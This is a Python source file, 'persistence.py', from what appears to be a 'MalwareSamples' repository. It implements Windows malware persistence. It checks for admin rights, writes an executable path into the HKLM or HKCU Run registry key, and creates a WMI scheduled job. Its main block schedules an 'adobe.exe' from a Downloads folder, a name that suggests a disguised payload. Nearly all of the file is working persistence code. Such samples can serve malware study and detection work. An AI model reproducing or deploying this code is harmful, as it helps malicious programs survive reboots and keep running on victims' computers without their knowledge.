"""
   Copyright (c) 2019 Jack Farley
   This file is part of MalwareSamples
   Usage or distribution of this software/code is subject to the
   terms of the GNU GENERAL PUBLIC LICENSE.
   persistence.py
   ---
"""


from winreg import *
import os
import wmi
import datetime


def has_admin():
    """
    Checks if the sample has admin priviledges


    https://stackoverflow.com/questions/2946746/python-checking-if-a-user-has-administrator-privileges/10671675

    :return: Username and admin priviledges flag
    """
    try:
        # only windows users with admin privileges can read the C:\windows\temp
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
    except:
        return os.environ['USERNAME'],False
    else:
        return os.environ['USERNAME'],True



def software_Microsoft_Windows_CurrentVersion_Run(process_path, process_name):
    privs = has_admin()

    """Use HKLM run key if we have the priviledge to do so"""
    if privs[1] is True:
        reg_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        registry_key = OpenKey(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_WRITE)
        install = process_path.replace("/", "\\")
        SetValueEx(registry_key, process_name, 0, REG_SZ, install)
        CloseKey(registry_key)


    else:
        """Set to current user run key"""
        reg_path = "Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = OpenKey(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE)
        install = process_path.replace("/", "\\")
        SetValueEx(registry_key, process_name, 0, REG_SZ, install)
        CloseKey(registry_key)

def wmi_persist(executable_path):
    c = wmi.WMI()
    one_minutes_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
    job_id, result = c.Win32_ScheduledJob.Create(
        Command=f"{executable_path}",
        StartTime=wmi.from_time(one_minutes_time),

    )



if __name__ == "__main__":
    wmi_persist("C:\\Users\\jfarl\\Downloads\\adobe.exe")